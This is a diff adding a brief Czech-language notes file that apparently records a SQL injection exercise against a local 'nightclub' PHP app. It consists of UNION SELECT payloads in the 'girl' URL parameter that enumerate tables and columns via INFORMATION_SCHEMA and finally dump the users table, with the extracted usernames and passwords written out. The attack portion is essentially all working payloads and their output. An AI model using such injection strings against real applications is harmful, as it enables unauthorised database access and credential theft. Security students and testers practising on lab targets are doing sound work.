@@ -1,0 +1,23 @@
+
+tabulky
+http://127.0.0.1:9999/nightclub/girldetail.php?girl=' UNION ALL SELECT TABLE_NAME as NAME, TABLE_NAME as AGE, TABLE_NAME as hair FROM INFORMATION_SCHEMA.TABLES WHERE '1'='1
+girls, news, users
+
+
+sloupce girls
+http://127.0.0.1:9999/nightclub/girldetail.php?girl=' UNION ALL SELECT column_name as NAME, column_name as AGE, column_name as hair FROM INFORMATION_SCHEMA.columns WHERE table_name = 'girls' AND '1'='1
+id, nick, age, hair, name, adresa, mesto, psc, rodne
+
+sloupce news
+http://127.0.0.1:9999/nightclub/girldetail.php?girl=' UNION ALL SELECT column_name as NAME, column_name as AGE, column_name as hair FROM INFORMATION_SCHEMA.columns WHERE table_name = 'news' AND '1'='1
+id,title,text,date_inserted,visible
+
+sloupce users
+http://127.0.0.1:9999/nightclub/girldetail.php?girl=' UNION ALL SELECT column_name as NAME, column_name as AGE, column_name as hair FROM INFORMATION_SCHEMA.columns WHERE table_name = 'users' AND '1'='1
+id, username, password
+
+
+
+http://127.0.0.1:9999/nightclub/girldetail.php?girl=' UNION ALL SELECT id as NAME, username as AGE, password as hair FROM users WHERE '1'='1
+admin - kr8va
+www - Heslo\
